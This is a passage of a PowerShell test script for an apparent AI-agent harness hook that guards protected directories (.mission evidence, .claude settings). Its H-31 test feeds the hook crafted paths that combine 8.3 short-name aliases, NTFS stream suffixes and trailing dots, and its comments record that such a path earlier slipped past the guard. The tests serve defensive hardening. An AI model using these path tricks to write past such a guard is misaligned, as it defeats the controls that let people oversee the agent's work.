  gate) and s4 (plain-stream shell) are controls already denied at round 2. An ALLOW row (a1, a2, a3) that
  denies means a re-resolution widened past the class -- a stream outside protected, or a root-seat
  parent-only path. ABSENT 8.3 aliases (F-0) is a RED sentence.
"@
Check -Id 'H-30' -Title 'the 8.3 alias + stream is refused on the two routes round 2 did not re-resolve -- a nested (deep) file-tool path reaching A1''s protected tier, and a shell command (a gate mint the metacharacter tier missed) -- while the nested-gate and plain-stream controls stay denied and a stream outside protected and a root-seat parent-only path stay allowed (WP-E2 round 3; validator round 2)' `
      -Ok $h30Ok -Detail $h30detail

# =============================================================================================
# H-31 -- THE COMPOSITION OF NORMALISATIONS: AN 8.3 ALIAS AND A TRAILING DOT (AND OPTIONALLY A STREAM)
#         ON ONE PATH, AGAINST A1'S PROTECTED TIER (WP-E2 round 4; validator round 3's refutation)
# =============================================================================================
# VALIDATOR ROUND 3 REFUTED the round-3 cure: MISSIO~1::$INDEX_ALLOCATION\evidence.\p.txt -- the 8.3
# alias of .mission PLUS a stream PLUS a TRAILING DOT on the `evidence` component -- reached A1's
# protected tier ALLOWED for the root-seat role (and the pure 8.3+dot MISSIO~1\evidence.\p.txt, no
# stream, is a confirmed real write). Get-EvidenceA1OfferForms applied Win32 (trailing-dot strip) and
# 8.3 (alias inversion) to the stream-stripped form INDEPENDENTLY and never COMPOSED them, so the
# fully-normalised .mission/evidence never appeared and A1's boundary matcher (which excludes '.')
# missed it. Round 4 closes the CLASS, not a fourth instance: the builder now closes each seed under
# {Win32, 8.3, stream-strip} to a fixpoint, so any composition yields the normalised form. This member
# drives the REAL hook over a hermetic root-seat fixture whose protected directories EXIST (real 8.3
# short names, read from the volume; an absent alias is a RED sentence).
$h31Ok = $true
$h31Bad = 0
$h31DenyWant = 0; $h31DenyOk = 0; $h31AllowWant = 0; $h31AllowOk = 0
$h31Lines = New-Object System.Collections.Generic.List[string]
$h31F0 = [ordered]@{}
$h31FixtureOk = $false
$h31Reached = $false
$h31Base = ''
$h31SavedProj = $env:CLAUDE_PROJECT_DIR
$h31SavedCeil = $env:GIT_CEILING_DIRECTORIES
$h31SavedMdi  = $env:MISSION_DISPATCH_ID
$a2e = '::$' + 'INDEX_ALLOCATION'
$m31  = '.mission'
$mr31 = '.mission' + '-runtime'
$cl31 = '.cl' + 'aude'
function Get-Wp1H31Short { param([string]$Path) try { return [string](New-Object -ComObject Scripting.FileSystemObject).GetFolder($Path).ShortName } catch { return '' } }
try {
    Remove-Item Env:\LAM_DISPATCH -ErrorAction SilentlyContinue
    $env:MISSION_DISPATCH_ID = 'session-wp1-h31'
    $h31Base = Join-Path ([System.IO.Path]::GetTempPath()) ('lam-wp1-h31-' + [guid]::NewGuid().ToString('N').Substring(0, 10))
    $null = New-Item -ItemType Directory -Force -Path $h31Base | Out-Null
    $env:GIT_CEILING_DIRECTORIES = $h31Base
    $h31Main = Join-Path $h31Base 'main'
    $enc31 = New-Object System.Text.UTF8Encoding($false)
    $gi = Invoke-Wp1H18Git -Dir $h31Base -GitArgs @('init', '-q', 'main')
    $h31F0['M: git init succeeded'] = ($gi.code -eq 0)
    $h31F0['M: its .git entry is a DIRECTORY (the root seat)'] = [System.IO.Directory]::Exists((Join-Path $h31Main '.git'))
    if ($h31F0['M: its .git entry is a DIRECTORY (the root seat)']) {
        [System.IO.File]::WriteAllText((Join-Path $h31Main 'seed.txt'), "seed`n", $enc31)
        $null = Invoke-Wp1H18Git -Dir $h31Main -GitArgs @('add', 'seed.txt')
        $gc = Invoke-Wp1H18Git -Dir $h31Main -GitArgs @('commit', '-q', '-m', 'seed')
        $h31F0['M: one commit'] = ($gc.code -eq 0)
        foreach ($d in @(($m31 + '\gates'), ($m31 + '\evidence'), ($m31 + '\notes'), ($mr31 + '\evidence'), $cl31, 'src')) {
            $null = New-Item -ItemType Directory -Force -Path (Join-Path $h31Main $d) | Out-Null
        }
        $h31aM  = Get-Wp1H31Short (Join-Path $h31Main $m31)
        $h31aMR = Get-Wp1H31Short (Join-Path $h31Main $mr31)
        $h31aC  = Get-Wp1H31Short (Join-Path $h31Main $cl31)
        $h31F0['M: .mission has an 8.3 alias (' + $h31aM + ')'] = ($h31aM -and ($h31aM -ne $m31))
        $h31F0['M: .mission-runtime has an 8.3 alias (' + $h31aMR + ')'] = ($h31aMR -and ($h31aMR -ne $mr31))
        $h31F0['M: .claude has an 8.3 alias (' + $h31aC + ')'] = ($h31aC -and ($h31aC -ne $cl31))
    }
    $h31F0['the fixture lies outside the repository under test'] = -not ($h31Base.StartsWith($repoRoot, [System.StringComparison]::OrdinalIgnoreCase))
    $h31FixtureOk = (@($h31F0.Values | Where-Object { -not $_ }).Count -eq 0)

    function Invoke-H31Row {
        param($Row)
        $env:CLAUDE_PROJECT_DIR = $h31Main
        Remove-Item Env:\LAM_DISPATCH -ErrorAction SilentlyContinue
        try {
            $payload = @{ session_id = 'session-wp1-h31'; hook_event_name = 'PreToolUse'; tool_name = $Row.tool
                          tool_input = $Row.ti; cwd = $h31Main } | ConvertTo-Json -Depth 10 -Compress
            $res = Invoke-Hook -Script 'evidence-guard-pretooluse.ps1' -Json $payload
        } finally { $env:CLAUDE_PROJECT_DIR = $sandbox }
        $gotDeny  = ($res.exit -eq 2) -and ($res.stdout -like '*"permissionDecision":"deny"*')
        $gotAllow = ($res.exit -eq 0) -and ($res.stdout -like '*"permissionDecision":"allow"*')
        $trip     = ($res.stdout -like '*SEAT TRIPWIRE*')
        $prot     = ($res.stdout -like '*protected path*')
        return [pscustomobject]@{ deny = $gotDeny; allow = $gotAllow; trip = $trip; prot = $prot; exit = $res.exit; out = $res.stdout }
    }
    function New-H31Row {
        param([string]$Id, [string]$Tool, $Ti, [string]$Want, [string]$Rule, [string]$Why)
        return [pscustomobject]@{ id = $Id; tool = $Tool; ti = $Ti; want = $Want; rule = $Rule; why = $Why }
    }
    $evDot   = (Join-Path $h31Main ($h31aM + '\evidence.\p.txt'))
    $evAdsDot= (Join-Path $h31Main ($h31aM + $a2e + '\evidence.\p.txt'))
    $rows31 = @()
    if ($h31FixtureOk) {
        # 8.3 alias + TRAILING DOT, no stream -- the pure composition (a real write).
        $rows31 += New-H31Row 'c1' 'Edit' @{ file_path = $evDot } 'deny' 'prot' '8.3 + trailing dot, no stream, top-level (.mission/evidence) -- THE PURE COMPOSITION'
        $rows31 += New-H31Row 'c2' 'Edit' @{ edits = @(@{ file_path = $evDot; old_string='a'; new_string='b' }) } 'deny' 'prot' 'the same, nested under edits[]'
        # 8.3 alias + stream + TRAILING DOT -- the headline refutation.
        $rows31 += New-H31Row 'c3' 'Edit' @{ file_path = $evAdsDot } 'deny' 'prot' '8.3 + stream + trailing dot, top-level (THE REFUTATION)'
        $rows31 += New-H31Row 'c4' 'Edit' @{ edits = @(@{ file_path = $evAdsDot; old_string='a'; new_string='b' }) } 'deny' 'prot' 'the same, nested under edits[]'
        $rows31 += New-H31Row 'c5' 'MultiEdit' @{ wrap = @{ path = $evAdsDot } } 'deny' 'prot' 'the same, nested under an arbitrary key {wrap:{path}}'
        $rows31 += New-H31Row 'c6' 'Write' @{ file_path = (Join-Path $h31Main ($h31aC + $a2e + '\settings.json.')) } 'deny' 'prot' '.claude/settings.json, 8.3 + stream + trailing dot'
        $rows31 += New-H31Row 'c7' 'Write' @{ file_path = (Join-Path $h31Main ($h31aMR + $a2e + '\evidence.\p.txt')) } 'deny' 'prot' '.mission-runtime/evidence, 8.3 + stream + trailing dot'
        $rows31 += New-H31Row 'c8' 'FileWrite' @{ file_path = $evAdsDot } 'deny' 'prot' 'an UNKNOWN write-tool name, 8.3 + stream + trailing dot'
        # ALLOW controls -- the closure narrows, not widens.
        $rows31 += New-H31Row 'a1' 'Edit' @{ file_path = (Join-Path $h31Main ($h31aM + '\notes.\x.txt')) } 'allow' 'none' '8.3 + trailing dot on .mission/NOTES -- parent-only from the root seat (must ALLOW)'
        $rows31 += New-H31Row 'a2' 'Edit' @{ file_path = (Join-Path $h31Main 'src\x.py.') } 'allow' 'none' 'a trailing dot outside protected (must ALLOW)'
        $rows31 += New-H31Row 'a3' 'Read' @{ file_path = $evAdsDot } 'allow' 'none' 'a READ through the 8.3 + stream + trailing-dot form (must ALLOW)'
    }
    foreach ($r in $rows31) {
        $v = Invoke-H31Row -Row $r
        $ok = $false
        if ($r.want -eq 'deny') {
            $h31DenyWant++
            $ok = $v.deny -and $v.prot -and (-not $v.trip)
            if ($ok) { $h31DenyOk++ }
        } else {
            $h31AllowWant++
            $ok = $v.allow -and (-not $v.trip)
            if ($ok) { $h31AllowOk++ }
        }
        if (-not $ok) { $h31Bad++ }
        $shown = if ($r.ti.Contains('file_path')) { '[' + $r.tool + '] ' + [string]$r.ti['file_path'] } else { '[' + $r.tool + '] (nested path)' }
        if ($h31Base) { $shown = $shown.Replace($h31Base, '<base>') }
        [void]$h31Lines.Add(('      {0,-4} want={1,-5} rule={2,-4} exit={3} {4} {5}' -f $r.id, $r.want.ToUpperInvariant(), $r.rule, $v.exit, $(if ($ok) { 'MATCH  ' } else { 'DIVERGE' }), $shown))
        [void]$h31Lines.Add('           ' + $r.why + $(if (-not $ok) { '  ||  said: ' + ((([string]$v.out) -replace '\s+', ' ').Substring(0, [Math]::Min(220, ([string]$v.out).Length))) } else { '' }))
    }
    $h31Reached = $h31FixtureOk -and ($h31DenyWant -eq 8) -and ($h31AllowWant -eq 3)
    if (-not $h31FixtureOk -or ($h31Bad -gt 0) -or -not $h31Reached) { $h31Ok = $false }
} catch {
    $h31Ok = $false
    [void]$h31Lines.Add(("      H-31 THREW at script line {0}: {1}" -f $_.InvocationInfo.ScriptLineNumber, $_.Exception.Message))
} finally {
    if ($null -ne $h31SavedProj) { $env:CLAUDE_PROJECT_DIR = $h31SavedProj } else { Remove-Item Env:\CLAUDE_PROJECT_DIR -ErrorAction SilentlyContinue }
    if ($null -ne $h31SavedCeil) { $env:GIT_CEILING_DIRECTORIES = $h31SavedCeil } else { Remove-Item Env:\GIT_CEILING_DIRECTORIES -ErrorAction SilentlyContinue }
    if ($null -ne $h31SavedMdi) { $env:MISSION_DISPATCH_ID = $h31SavedMdi } else { Remove-Item Env:\MISSION_DISPATCH_ID -ErrorAction SilentlyContinue }
    Remove-Item Env:\LAM_DISPATCH -ErrorAction SilentlyContinue
    if ($h31Base -and (Test-Path -LiteralPath $h31Base)) {
        try { Remove-Item -LiteralPath $h31Base -Recurse -Force -ErrorAction Stop } catch { }
    }
}
$h31F0Lines = @($h31F0.Keys | ForEach-Object { ('      [{0}] {1}' -f $(if ($h31F0[$_]) { 'ok' } else { 'NO' }), $_) })
$h31detail = @"
  ONE QUESTION -- does the REAL hook refuse a write whose target needs an 8.3 alias inversion AND a Win32
  trailing-dot strip (and optionally a stream strip) COMPOSED to resolve under a protected path? The A1
  offer builder now closes each seed under {Win32, 8.3, stream-strip} to a fixpoint.
    F-0, the fixture and its 8.3 aliases:
$($h31F0Lines -join "`n")
      deny rows denied by A1's protected tier : $h31DenyOk of $h31DenyWant
      allow rows allowed                       : $h31AllowOk of $h31AllowWant
      divergences                              : $h31Bad   (expect 0)
      table reached                            : $h31Reached   (expect True -- 8 deny, 3 allow)
$($h31Lines -join "`n")
  WHAT A RED ROW MEANS. c1-c8 (a composition -- 8.3 + trailing dot, with or without a stream, top-level or
  nested or unknown-tool -- reaching a protected member) that ALLOW is validator round 3's class, the
  transforms applied singly rather than composed. An ALLOW row (a1, a2, a3) that denies means the closure
  widened past the class -- a root-seat parent-only path, a path outside protected, or a read. ABSENT 8.3
  aliases (F-0) is a RED sentence.
"@
Check -Id 'H-31' -Title 'the composition of normalisations -- an 8.3 alias AND a Win32 trailing dot (and optionally a stream) on one path -- is refused against A1''s protected tier, top-level and nested and unknown-tool, because the A1-offer builder closes each seed under {Win32, 8.3, stream-strip} to a fixpoint; a root-seat parent-only path, a path outside protected, and a read stay allowed (WP-E2 round 4; validator round 3''s refutation)' `
      -Ok $h31Ok -Detail $h31detail

# =============================================================================================
# summary -- counts DERIVED from the recorder, never hand-authored (law 3 / law 5)
# =============================================================================================
if (-not $KeepSandbox) {
    try { Remove-Item -LiteralPath $sandbox -Recurse -Force -ErrorAction Stop } catch { }
}

Write-Host ""
Write-Host "------------------------------------------------------------------------------"
if ($failures -eq 0 -and $skips -eq 0) { Write-Host " WP-1: all $checksRun checks passed." }
elseif ($failures -eq 0) {
    Write-Host " WP-1: $($checksRun - $skips) of $checksRun checks passed, $skips SKIPPED -- a skip is not a pass; see the [SKIP] line(s) above."
}
else { Write-Host (" WP-1: $failures of $checksRun checks FAILED." + $(if ($skips -gt 0) { '  (' + $skips + ' SKIPPED.)' } else { '' })) }
Write-Host "------------------------------------------------------------------------------"
Write-Host "EXIT: $failures"
exit $failures
